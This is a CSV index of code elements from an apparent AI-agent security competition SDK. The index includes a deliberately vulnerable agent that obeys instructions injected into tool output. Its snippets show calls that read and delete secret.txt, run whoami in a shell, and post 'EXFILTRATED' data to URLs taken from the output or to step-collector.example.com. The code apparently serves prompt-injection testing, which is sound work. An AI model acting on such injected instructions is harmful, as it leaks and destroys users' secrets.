relative_path,node_type,name,line_start,line_end,detail,snippet_sha256
aicomp_sdk/agents/debug.py,FUNCTION,_summarize_history_event,168,189,signature=_summarize_history_event(event),4286A846DE6D5A4E082FA9EED295539B8295A005A2D89FD060727A2B93A745DD
aicomp_sdk/agents/debug.py,FUNCTION,_preview_text,192,196,signature=_preview_text(text),0048F2F924A03DE515424D6ACFCBA626CF8A31B3DF5B39C022DE99FC170B2FBD
aicomp_sdk/agents/debug.py,CALL,dataclass,32,32,dataclass(frozen=True),6B38C9A9ED64FCD7602BBA1EFAE5A3586F70A4A4743870B5A2C05E97C0612544
aicomp_sdk/agents/debug.py,FUNCTION,record,53,54,"signature=record(self, event)",F2CFCA8C2AD84F3985702AF11BCBCACFF7866C11FFAE461B6E459C70FB2225A9
aicomp_sdk/agents/debug.py,FUNCTION,__init__,60,61,signature=__init__(self),BE63FF31A7994C1FE14BD96D7AA7631C766A45BD246F4AF4E9E0019149053766
aicomp_sdk/agents/debug.py,FUNCTION,record,63,64,"signature=record(self, event)",C307B054531FDA4668CF1E6F319A6FF9DF3F8E92C192B1C69507486AD4068C5B
aicomp_sdk/agents/debug.py,FUNCTION,__init__,70,73,"signature=__init__(self, path)",E125A9CFC937302A77BA0B8DA225F9A2736C446F40EEC6E7918C6D1C86B7FBA7
aicomp_sdk/agents/debug.py,FUNCTION,record,75,78,"signature=record(self, event)",6D872D5FF790FF8B6CF3DF821CEFB70F45D3D531F6C91B5D2930DC4CCCB2056D
aicomp_sdk/agents/debug.py,IF_CONDITION,if,85,86,all_events,1B65371B3BB01DEA5FD8B7E872A789CB8CC3AE33576AB77D4E53B2608B768F79
aicomp_sdk/agents/debug.py,IF_CONDITION,if,96,97,"value is None or isinstance(value, (bool, int, float, str))",C91C93072135E5CC87DE8E74D9E9D79B8DB73FF06C4A336C10BE10ACAFA79DAD
aicomp_sdk/agents/debug.py,IF_CONDITION,if,98,99,"isinstance(value, Path)",0AD184734CF8BD28DBC15688AC5C66649C643C1D842B225111553650F0865ED9
aicomp_sdk/agents/debug.py,IF_CONDITION,if,100,101,"is_dataclass(value) and not isinstance(value, type)",15329BCB83AF621C833FFF7E7446D40D0ED8EBA96F05CC747D953C98C28A34DC
aicomp_sdk/agents/debug.py,IF_CONDITION,if,102,103,"isinstance(value, Mapping)",D25A7476A34103B6831AE640C29DFC4E661B914D53DACF9FC8FB759C6E1FF374
aicomp_sdk/agents/debug.py,IF_CONDITION,if,104,105,"isinstance(value, tuple)",449EB031A53A03977E1438D1683FA89C5292FDF4556DC926FE678C95406FDA98
aicomp_sdk/agents/debug.py,IF_CONDITION,if,106,107,"isinstance(value, list)",290C5312DF541146BC82F7F8342BFB8BDC8F4862698803F5D26CCAFD221BADF0
aicomp_sdk/agents/debug.py,IF_CONDITION,if,108,109,"isinstance(value, set)",14EDA2248324CAB3CB6580F74DBD701576A5CE5C9AB4D4CE9099A8106ED91787
aicomp_sdk/agents/debug.py,IF_CONDITION,if,111,115,callable(model_dump),25978B9964F74A6B754DA2ABCBC9D9F13C979EC264E86FDCD68FCEE9A2CE4ABA
aicomp_sdk/agents/debug.py,IF_CONDITION,if,116,117,"hasattr(value, ""__dict__"")",40DF0D4C834156CC35A1CA8AF7E7E8A3628ACDC948F1AF812EB0959C5953565D
aicomp_sdk/agents/debug.py,IF_CONDITION,if,122,131,"isinstance(decision, ToolCallDecision)",A0BD90AAF64CB2EDC350A47C6BCC5408815D04A9033C29E689FC3B2FBE049864
aicomp_sdk/agents/debug.py,IF_CONDITION,if,132,133,"isinstance(decision, FinalResponseDecision)",A56880FE38345E50C1463814CCC135913460B7534F35B9E3EC275241DFD4319F
aicomp_sdk/agents/debug.py,IF_CONDITION,if,155,156,"isinstance(event, InstructionEvent)",260362905F46C6A35D8F28D3EE88E75D401178B02F9CA87AE44DC64F4B589C79
aicomp_sdk/agents/debug.py,IF_CONDITION,if,157,158,"isinstance(event, UserMessageEvent)",A0627D1B518886EE333DB40BA3BCDB182619C4D6455866FF14141F714AA8BFB0
aicomp_sdk/agents/debug.py,IF_CONDITION,if,159,160,"isinstance(event, AssistantMessageEvent)",BB6ACBDA40EC7B050DFAB41A8C07EC11E5369EBBBBBC93297D256FCB884778BB
aicomp_sdk/agents/debug.py,IF_CONDITION,if,161,162,"isinstance(event, ToolRequestEvent)",D46DD7117D19FCF73F44C1DE84DBDF49A28E341F00CD6F57ECCADE13C4E4EC85
aicomp_sdk/agents/debug.py,IF_CONDITION,if,163,164,"isinstance(event, ToolResultEvent)",C3D6531EB01D37946E1B9322197CEDDA17AF80D7486E701A666FE7DD053589B7
aicomp_sdk/agents/debug.py,IF_CONDITION,if,169,174,"isinstance(event, (InstructionEvent, UserMessageEvent, AssistantMessageEvent))",1A25B404C1C9D11D43D7535B247EA55739118255E98BB95988341AACEE77DE7F
aicomp_sdk/agents/debug.py,IF_CONDITION,if,175,180,"isinstance(event, ToolRequestEvent)",5B422DB11FEED41EFC08B5C30CD8830E1C83D87E7C68EED9064A9B39DD79BB7C
aicomp_sdk/agents/debug.py,IF_CONDITION,if,181,188,"isinstance(event, ToolResultEvent)",B8D626F82B9BB5F7E7295DCC157DB7024614232EDEE73336189844E386E547AB
aicomp_sdk/agents/debug.py,IF_CONDITION,if,194,195,len(normalized) <= _TEXT_PREVIEW_LIMIT,7D980B13DCCCD642D799D2A13E633691F0889CB9307CF19101DDF21AA1205586
aicomp_sdk/agents/debug.py,IF_CONDITION,if,129,130,decision.assistant_message is not None,39ECE5BC3C10C976E8BC33B55126EFE76081E39656A0DF6123355BD6D819EAA7
aicomp_sdk/agents/debug.py,CALL,Path,71,71,Path(path),7F10BF5BBDF9DB9E56AA25F03CAFAEE9461928F4FD97525514B0F5E59DB449EC
aicomp_sdk/agents/debug.py,CALL,self.path.parent.mkdir,72,72,"self.path.parent.mkdir(parents=True, exist_ok=True)",5D0D96F412D429215075CA237AE2160C6C3614886107121EBE139BD7FD22C4BF
aicomp_sdk/agents/debug.py,CALL,self.path.write_text,73,73,"self.path.write_text("""", encoding=""utf-8"")",CBBA5259FF0487D7617886CB6360D1787F8B970C0F0885F8086169F38DD4ED7B
aicomp_sdk/agents/debug.py,CALL,is_dataclass,100,100,is_dataclass(value),792DD9C36CC2B64DF70958138E2290F31423B61835732444E673D2F0E3B1ED09
aicomp_sdk/agents/debug.py,CALL,self.path.open,76,76,"self.path.open(""a"", encoding=""utf-8"")",14650644CA10142776250D59209407E91561F78F503660F555A65DE25BC2A7C7
aicomp_sdk/agents/debug.py,ATTRIBUTE_READ_OR_WRITE,decision.call.tool_name,126,126,decision.call.tool_name,16FE485673B543C9233AAB74E4AAEA287C3B3502F0BCC32DDF4CE85D1172C0B4
aicomp_sdk/agents/debug.py,ATTRIBUTE_READ_OR_WRITE,event.call.tool_name,178,178,event.call.tool_name,D6F7C7DCCF097A02078AF1CE851F2A6E8C571E9A9D073592B8CA77CD5B98952F
aicomp_sdk/agents/debug.py,ATTRIBUTE_READ_OR_WRITE,event.result.tool_name,184,184,event.result.tool_name,8B432C6F0A7E5DB3773229AEE4489EF060C4F4A725D1F953A22C8F9E284AFB5D
aicomp_sdk/agents/deterministic_agent.py,CLASS,VulnerableDeterministicAgent,76,432,bases=,F4355A61ED41B53969FA0CA769229D4B4CBF617A37C21CC44267412F99985638
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,__init__,82,85,signature=__init__(self),C7451CF858D5DC2C7F824FF8DBF8656A53F2382FB0FAD9B328B36CB22B648580
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_tool_call,87,94,"signature=_tool_call(self, tool, args, reason)",645D535CEC6EBEB24C31634C192E5C865DC71D815F6D073A673FF13CCB3F778E
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_find_url,96,100,"signature=_find_url(self, output)",AAC7F8D9EF394110F2E0CD748F16951FFCC66A8DD7CE6BDBCBB1554EB7CC38B7
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_read_file_call,102,108,"signature=_read_file_call(self, message)",F5E4FB63C5841DF3B66CDCF30A8A79B07F1BCFDB9E6E7693C36D1DA9BC6C31F1
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_extract_open_page_id,110,121,"signature=_extract_open_page_id(self, message)",12DDC9BC610B39ECEF9E16D598F8B058D0E9CDF1F51A6157A7FEEE33CA4DFDCC
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_extract_email_id,123,128,"signature=_extract_email_id(self, message)",791607D0B4B8D03FAE7F164017D0508A5FC43D1ED7E9DDDB51A683D2348665EA
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_parse_instructions_from_output,130,232,"signature=_parse_instructions_from_output(self, output)",81BCA20ACE025367A7E37DF6290AD0F06CB3B561799F6FCDB4AB2E571418D627
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_last_tool_output,234,238,"signature=_last_tool_output(self, history)",0963AC72E1BB3B46E88EA863117C1CA47C6525F27658D9A867946D87FCEC6D33
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_last_user_message,240,244,"signature=_last_user_message(self, history)",D1D3A81BD6FE593A14A0CA26743E35A9C366A67C121541BA09B14B590DF54877
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,next_action,246,372,signature=next_action(self),56605CCB41965B6901C9C20E6AD7DDE6F93F105E81DBF1FC031C1ACEDDD8981D
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,reset_state,374,376,signature=reset_state(self),DE223D38712D4F48CA531081AD56CCBDD6FB6EDB83DF26FEE7685FBB106B955C
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,snapshot_state,378,383,signature=snapshot_state(self),41C49203DD299949015A3D4C1470ED61941348EE64FE1E09C8C6405E8C182A2E
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,restore_state,385,394,"signature=restore_state(self, snapshot)",D561E0DE53FF9FDCD710B042A7E86597A64596E77580BD945935C8A6D21D3EC5
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_record_debug_event,396,417,signature=_record_debug_event(self),C58F1B0D76D174894FE2ED23E3E76759670836CF21B31FC557BD73E0F4134D4E
aicomp_sdk/agents/deterministic_agent.py,FUNCTION,_return_with_debug,419,432,signature=_return_with_debug(self),5C1C90F61D9DD4D073BAEAFF24ACE6CE2A2D8826E4DE690D413A3E03B85BF84D
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,98,99,match is None,E0D49C7E836FC41CEA6A88F38C7500ED83EFFED3CA24B882F5E0316952860401
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,106,107,"""file"" in message",8CB32B6794FC18ED33E5258465E15872B863840F4627FC48A59A1BA5EB41BCDE
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,132,133,not output,DD0A5C7466B0672CE60BCE3BF48E2E87F65C2EC3B598D520A0EAC72F2DE8E1E7
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,138,169,any(phrase in output_lower for phrase in _INSTRUCTION_RESET_PHRASES),5E5DB20663EB6236DB4E99124CF3AD474894D4D7903503FD2296A6D7472FE100
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,172,195,any(phrase in output_lower for phrase in _IMPERATIVE_PHRASES),D6C1D02B5A7C81816E9FCB015FACB81FFE74F984D98F353AD89693DD08683A5C
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,198,212,any(phrase in output_lower for phrase in _AUTHORITY_PHRASES),8DD2C0760675BBBC3E047A2BDFD161C6041C321C9D3071FABF03CFE1C0EE5190
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,215,230,any(marker in output_lower for marker in _STEP_MARKERS),018D045621A5E6CF4AFC84B4FB3636D5DDFEA63EFA90090E72DA37C9465F9B28
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,264,278,last_tool_output and len(last_tool_output) > 20,E19CC22F6D46D35AAA645C66980AF1D035EA71C79B403E0F94E31BE7252AEB89
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,287,292,not user_message,43D3C574EAA56E818AA742594349A34783E19F457BF0695801926A02045D377A
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,296,302,"""search"" in u",86429A6E2425077C06C83BFCE91CECEAEC47276018D19E3A7E57494CF348089C
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,303,309,"""open"" in u",84068462D0B1CB2DD692C90D10DF03CCF41E903632F3C05031C6224DC30B5CA3
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,310,316,"""read email"" in u or ""email"" in u",D7DB6F4D7F0319D10E7FB5154F5B49DEE541B9CC52B7041FF6F22A866274C4DE
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,317,324,"""read"" in u",89C82A3D238371AFAC603DBFB1878213510B824E3C3282108DA95A375E218AC7
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,325,334,"""write"" in u or ""save"" in u",3704B24DC0791A6E956A1694EF6D59FB2E4B9BB7A29D8278DE58ED7FB53E4A22
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,335,340,"""delete"" in u",C8A91F476A3730327385C57F88DF5A0082F2386B9C353BD1F08DA4B19FA77AD6
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,341,346,"""shell"" in u or (""run"" in u and ""echo"" in u)",C93CA3539A63EE83CA76717A3688476A3C00AEDB12F64E8319204CFD0D5613C9
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,347,356,"""send"" in u and ""email"" in u",F6E8023C1342341540B69543628D5D8F38E02D6A4B67F5946364ADA169D1CA3F
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,357,366,"""upload"" in u or ""post"" in u",035503D3AFBF90282DAE0048323A1CF3D25E292CC42A7FEA67606025A8D68673
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,386,389,"snapshot[""version""] != AGENT_STATE_VERSION",3DA1C18570DED34F6D826F5948381FBA0C73EDF542929F67FBB9C083E2E3EA6F
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,390,393,"snapshot[""backend""] != ""deterministic""",C546837A4DCCADB32157B6663E61139C9910FC2BD1B49262037770C0CE328580
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,405,406,self._debug_sink is None,1A17993DA4A0B58628BDE7BA75481DEC32B050C853EA14B6501DF9BCD269EFCF
aicomp_sdk/agents/deterministic_agent.py,CALL,ToolCall,88,92,"ToolCall(
            call_id=f""call_{self._next_call_index:06d}"",
            tool_name=tool,
            arguments=args,
        )",AC575DCCA1EE7ED63F22545EF70D42C27DDC21091AC0BA05DBBC85AFE1F9BFC7
aicomp_sdk/agents/deterministic_agent.py,CALL,ToolCallDecision,94,94,"ToolCallDecision(call=call, assistant_message=None)",BEB9E13A53D27F386023F0EE42CC0F4F4393539BAA32509787192470D730F39A
aicomp_sdk/agents/deterministic_agent.py,CALL,_URL_RE.search,97,97,_URL_RE.search(output),BB189F0A8CC1ED5ECE4C23FF7F74F404DC8FCFD5AEE60C81201470619014A826
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,104,105,keyword in message,6BA72930AE3298F134C83994BD8627D2BB5E0AA9EFD8C5D471831866BEE56537
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,113,114,"""_"" in clean_word or clean_word in (""demo"", ""welcome"", ""howto"")",5CF983FFB460C056C80B90265B82022EC331761897366AE957799BF80D10D5AE
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,118,119,page_id in normalized_message,A3287E754FED32E7465BC4FD1A5ED47177ACEF7E27CD1DC16B200D42E0DD37BC
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,126,127,"clean_word.startswith(""msg"")",801B909C7961F131428774FD6314323116DB29E5C0B102B7ED7CC5F653CE4338
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,140,145,"(""read"" in output_lower or ""access"" in output_lower) and ""secret"" in output_lower",C8522EFB0C81F59D00A69051976634CA815935A44DCBA621FA0D18859F7AE87A
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,147,155,"""http.post"" in output_lower or (
                ""post"" in output_lower and ""https://"" in output_lower
            )",525E7CBA964525EC2D8ADB839A48AE533F74C147D783E2246C0250A8CD40C5D0
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,157,162,"""delete"" in output_lower and ""secret"" in output_lower",722763F059BA47B1EEEF3E7FC09067E59D1FB158F1938EB393F93E85CFE3F9F5
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,164,169,"""shell"" in output_lower or (""run"" in output_lower and ""command"" in output_lower)",047596CAA83FE59B1FCCC822E47887E1F02FFCCAF832FE78EE40F870C4C108D8
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,174,177,"(""read"" in output_lower or ""access"" in output_lower) and (
                ""secret"" in output_lower or ""credential"" in output_lower
            )",C7903455E3849238E60806C53C7ACF1E40404EFB1CAB2D49DADB6E3CCFEED9D0
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,178,187,"(
                ""send"" in output_lower or ""transmit"" in output_lower or ""post"" in output_lower
            ) and ""https://"" in output_lower",CD6AB471DD0E3480718394F3117B1A7796D0A29CA709291769768E0EF4A3C50A
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,188,189,"""delete"" in output_lower and ""secret"" in output_lower",1A079AC670AC3C31275DF425CE8740709A62487523473BC558E3E2D5977A961D
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,190,195,"(""shell"" in output_lower or ""run"" in output_lower) and (
                ""verification"" in output_lower
                or ""diagnostic"" in output_lower
                or ""command"" in output_lower
            )",8C89C621648D966B2B5B5C92F820A18B4121A011F025585E3306AA4E9CDD84FE
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,200,201,"""read"" in output_lower or ""access"" in output_lower or ""audit"" in output_lower",0709DA018DEE3A0077ED773324DEE1C0209E3422294505313334F73EC9F120E7
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,203,212,"(
                ""send"" in output_lower or ""transmit"" in output_lower or ""report"" in output_lower
            ) and ""https://"" in output_lower",B7AC1A978C8887D47D2704082313AD0E8B16FBA9785F60CDAE2C49FED6118111
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,217,220,"""read"" in output_lower and (
                ""secret"" in output_lower or ""credential"" in output_lower or "".txt"" in output_lower
            )",2BD25BA4CBC36601EBA03968988182C2D561A6E9A8414649F36602756E8FD8DE
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,222,230,"""post"" in output_lower or ""send"" in output_lower",3BC4E8F0980FA011E6E9E1A6D00A444BABCE1A484C07D05D68AFFE2E9BBDBDC5
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,236,237,"isinstance(event, ToolResultEvent)",23A69705255D448FE51906C97B6CD4DAFD5B9E1360262A9ABD936C200D8756DD
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,242,243,"isinstance(event, UserMessageEvent)",6D037CE37ABD2268666D0E79C7F46C134F3FF5CEDEE0E67C92F3CB4866ED1AC2
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,267,278,injected_call,6126F23972CBC5F53F5B14827810A2D44D3D427EF874FCF6A03C1F27157F55EA
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,319,324,read_call is not None,DDCA598231531522C8B35BDF8615459C565B51ED2A866F1C0F9CAF6C9E6B35E1
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,107,107,"self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""read_file"")",150CBBF5ACFECB63C6BEA9EA0CF83B65BCE0FF99D5CE6063FC8225BD2CC74A73
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,182,187,matched_url is not None,E1731D863BB3C2A8E48F51889FE5B8CD85DABDF7794E03278BDDEEE9B39512EA
aicomp_sdk/agents/deterministic_agent.py,IF_CONDITION,if,207,212,matched_url is not None,7A2D6095D1A25E81E02D1A4679C7EF5C33518C64197733C6E73BFDA0F53B3C70
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._last_tool_output,256,256,self._last_tool_output,CD2F1BFD92629FF2E1BCB31C573DC5EC4F4CCF9279AD389D225C93F59E40F310
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,105,105,"self._tool_call(""fs.read"", {""path"": path}, ""read_file"")",FABE49FEDD3FE532669F68279257B1A2A8D9308ACB029644B948E1F287C9088D
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,107,107,self._tool_call,150CBBF5ACFECB63C6BEA9EA0CF83B65BCE0FF99D5CE6063FC8225BD2CC74A73
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,141,145,"self._tool_call(
                    ""fs.read"",
                    {""path"": ""secret.txt""},
                    ""followed_injected_instruction"",
                )",18E4A46FD138D376063082231DB4CB0A0842C3BAC8405A5703B5F36563630C40
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,151,155,"self._tool_call(
                    ""http.post"",
                    {""url"": url, ""data"": ""SECRET_MARKER""},
                    ""followed_injected_instruction"",
                )",877E2AD1E7016B19B8BEA63C8A45C9039A58118D3CCC0A616E333033BDF22D0A
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,158,162,"self._tool_call(
                    ""fs.delete"",
                    {""path"": ""secret.txt""},
                    ""followed_injected_instruction"",
                )",2EEF0770F9489752E223C97EC5EA6ABD393F373FF9A6EF3C5F89AB7B73DF09C3
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,165,169,"self._tool_call(
                    ""shell.run"",
                    {""cmd"": ""whoami""},
                    ""followed_injected_instruction"",
                )",E442FDBB2BE3317CFDE211B8E0F015BA81888BB16B795585406791B6784B687F
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,177,177,"self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_command"")",2E57E8662F8143021F010FF6B07E2DFE85499B5D6EF86D0553066133883097FF
aicomp_sdk/agents/deterministic_agent.py,CALL,self._find_url,181,181,self._find_url(output),BA70B020F03ED4C2E8C5B1B40104E6BA1B55554DAF11ACCC0B5D390772A636F5
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,189,189,"self._tool_call(""fs.delete"", {""path"": ""secret.txt""}, ""followed_command"")",D4BE04897A2AF59B027108CEF40A0D18934CB532048B7F8AE26DF86924DFF8FA
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,195,195,"self._tool_call(""shell.run"", {""cmd"": ""whoami""}, ""followed_command"")",34E75075D4A207747942759DC14A0EDCD6D9F75E387D73AA8CA8C954A54FF66E
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,201,201,"self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_authority"")",427095B6F99BC396F7B3B9B2499E6DCE8A549DFD026DBE084654AD5138266CD7
aicomp_sdk/agents/deterministic_agent.py,CALL,self._find_url,206,206,self._find_url(output),BA70B020F03ED4C2E8C5B1B40104E6BA1B55554DAF11ACCC0B5D390772A636F5
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,220,220,"self._tool_call(""fs.read"", {""path"": ""secret.txt""}, ""followed_steps"")",767E8FA15CAF2B37B4C4E90A341690FAF9AE21942F205AE9940B6A1CD3429DB4
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,223,230,"self._tool_call(
                    ""http.post"",
                    {
                        ""url"": ""https://step-collector.example.com/data"",
                        ""data"": ""STEP_FOLLOW"",
                    },
                    ""followed_steps"",
                )",3D499030A37A0857B5295F57E00B7D17D6157A814D8AD7A9B02D44A9E725891C
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,105,105,self._tool_call,FABE49FEDD3FE532669F68279257B1A2A8D9308ACB029644B948E1F287C9088D
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,141,141,self._tool_call,FD1B9CB89228815A48566589BB3EA22CE4D45E44432260A1E140AA0026B37868
aicomp_sdk/agents/deterministic_agent.py,CALL,self._find_url,150,150,self._find_url(output),04E4A21227D4F58AB59A2B27F093E029B3C5F16765DC7B3A2C0C5DEF332AC02B
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,151,151,self._tool_call,FD1B9CB89228815A48566589BB3EA22CE4D45E44432260A1E140AA0026B37868
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,158,158,self._tool_call,FD1B9CB89228815A48566589BB3EA22CE4D45E44432260A1E140AA0026B37868
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,165,165,self._tool_call,FD1B9CB89228815A48566589BB3EA22CE4D45E44432260A1E140AA0026B37868
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,177,177,self._tool_call,2E57E8662F8143021F010FF6B07E2DFE85499B5D6EF86D0553066133883097FF
aicomp_sdk/agents/deterministic_agent.py,CALL,self._tool_call,183,187,"self._tool_call(
                        ""http.post"",
                        {""url"": matched_url, ""data"": ""EXFILTRATED""},
                        ""followed_command"",
                    )",3F7512A5FA49A0F48059E9251B3C42541FF93B52B5E2831734135C50CA8EA6BE
aicomp_sdk/agents/deterministic_agent.py,ATTRIBUTE_READ_OR_WRITE,self._tool_call,189,189,self._tool_call,D4BE04897A2AF59B027108CEF40A0D18934CB532048B7F8AE26DF86924DFF8FA
